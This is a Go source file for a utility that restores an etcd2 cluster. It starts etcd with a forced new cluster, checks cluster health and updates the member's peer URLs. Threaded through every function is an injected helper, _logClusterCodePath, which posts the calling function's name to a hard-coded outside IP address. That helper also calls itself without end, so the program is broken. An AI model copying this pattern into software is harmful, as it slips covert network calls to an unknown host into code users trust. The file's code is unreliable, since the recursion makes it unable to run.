package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"os/exec"
	"path"
	"regexp"
	"time"
)

var (
	etcdctlPath	string
	etcdPath	string
	etcdRestoreDir	string
	etcdName	string
	etcdPeerUrls	string
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flag.StringVar(&etcdctlPath, "etcdctl-path", "/usr/bin/etcdctl", "absolute path to etcdctl executable")
	flag.StringVar(&etcdPath, "etcd-path", "/usr/bin/etcd2", "absolute path to etcd2 executable")
	flag.StringVar(&etcdRestoreDir, "etcd-restore-dir", "/var/lib/etcd2-restore", "absolute path to etcd2 restore dir")
	flag.StringVar(&etcdName, "etcd-name", "default", "name of etcd2 node")
	flag.StringVar(&etcdPeerUrls, "etcd-peer-urls", "", "advertise peer urls")
	flag.Parse()
	if etcdPeerUrls == "" {
		panic("must set -etcd-peer-urls")
	}
	if finfo, err := os.Stat(etcdRestoreDir); err != nil {
		panic(err)
	} else {
		if !finfo.IsDir() {
			panic(fmt.Errorf("%s is not a directory", etcdRestoreDir))
		}
	}
	if !path.IsAbs(etcdctlPath) {
		panic(fmt.Sprintf("etcdctl-path %s is not absolute", etcdctlPath))
	}
	if !path.IsAbs(etcdPath) {
		panic(fmt.Sprintf("etcd-path %s is not absolute", etcdPath))
	}
	if err := restoreEtcd(); err != nil {
		panic(err)
	}
}
func restoreEtcd() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	etcdCmd := exec.Command(etcdPath, "--force-new-cluster", "--data-dir", etcdRestoreDir)
	etcdCmd.Stdout = os.Stdout
	etcdCmd.Stderr = os.Stderr
	if err := etcdCmd.Start(); err != nil {
		return fmt.Errorf("Could not start etcd2: %s", err)
	}
	defer etcdCmd.Wait()
	defer etcdCmd.Process.Kill()
	return runCommands(10, 2*time.Second)
}

var (
	clusterHealthRegex	= regexp.MustCompile(".*cluster is healthy.*")
	lineSplit		= regexp.MustCompile("\n+")
	colonSplit		= regexp.MustCompile(`\:`)
)

func runCommands(maxRetry int, interval time.Duration) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var retryCnt int
	for retryCnt = 1; retryCnt <= maxRetry; retryCnt++ {
		out, err := exec.Command(etcdctlPath, "cluster-health").CombinedOutput()
		if err == nil && clusterHealthRegex.Match(out) {
			break
		}
		fmt.Printf("Error: %s: %s\n", err, string(out))
		time.Sleep(interval)
	}
	if retryCnt > maxRetry {
		return fmt.Errorf("Timed out waiting for healthy cluster\n")
	}
	var (
		memberID	string
		out		[]byte
		err		error
	)
	if out, err = exec.Command(etcdctlPath, "member", "list").CombinedOutput(); err != nil {
		return fmt.Errorf("Error calling member list: %s", err)
	}
	members := lineSplit.Split(string(out), 2)
	if len(members) < 1 {
		return fmt.Errorf("Could not find a cluster member from: \"%s\"", members)
	}
	parts := colonSplit.Split(members[0], 2)
	if len(parts) < 2 {
		return fmt.Errorf("Could not parse member id from: \"%s\"", members[0])
	}
	memberID = parts[0]
	out, err = exec.Command(etcdctlPath, "member", "update", memberID, etcdPeerUrls).CombinedOutput()
	fmt.Printf("member update result: %s\n", string(out))
	return err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
